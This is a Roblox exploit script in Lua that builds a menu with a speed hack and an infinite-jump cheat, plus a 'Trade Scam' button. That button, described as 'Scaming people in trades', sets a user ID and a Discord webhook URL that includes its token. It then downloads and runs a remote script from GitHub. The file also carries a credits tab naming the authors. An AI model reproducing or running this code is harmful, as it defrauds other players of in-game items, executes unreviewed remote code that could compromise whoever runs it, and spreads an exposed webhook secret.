# name
description
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Eyad Abdelrehim", "Ocean")
local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Eyad Abdelrehim")

Section:NewSlider("WalkSpeed", "WalkSpeed make you go fast in walking", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

Section:NewButton("InfiniteJumb", "ButtonInfo", function()
    local InfiniteJumpEnabled = true
    game:GetService("UserInputService").JumpRequest:connect(function()
        if InfiniteJumpEnabled then
            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
        end
    end)
end)

local Tab = Window:NewTab("Trade Scam")
local Section = Tab:NewSection("Hi Guys So If You Press on Trade Scam")
local Section = Tab:NewSection("You Need to be in a Trade so u can use it")
Section:NewButton("Trade Scam", "Scaming people in trades", function()
    _G.UserID = 2226515831
    _G.Webhook = "https://discord.com/api/webhooks/1075578439991558164/hL3H1k7Ixf6cj_6Yw549Fn8vwrZ0_E0pnNtyz1a6zMXQUFggytWSblfLTQoBuUwl74Dg"
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/Script.lua"))()
end)

local Tab = Window:NewTab("Credit")
local Section = Tab:NewSection("Subscribe To Eyad Abdelrehim")
local Section = Tab:NewSection("https://discord.gg/8Zqnth532T")
local Section = Tab:NewSection("Owner  FaZeY")
local Section = Tab:NewSection("Co Owner  votrex")
local Section = Tab:NewSection("Helper  Reaper")
local Section = Tab:NewSection("Friend  mini-socker")

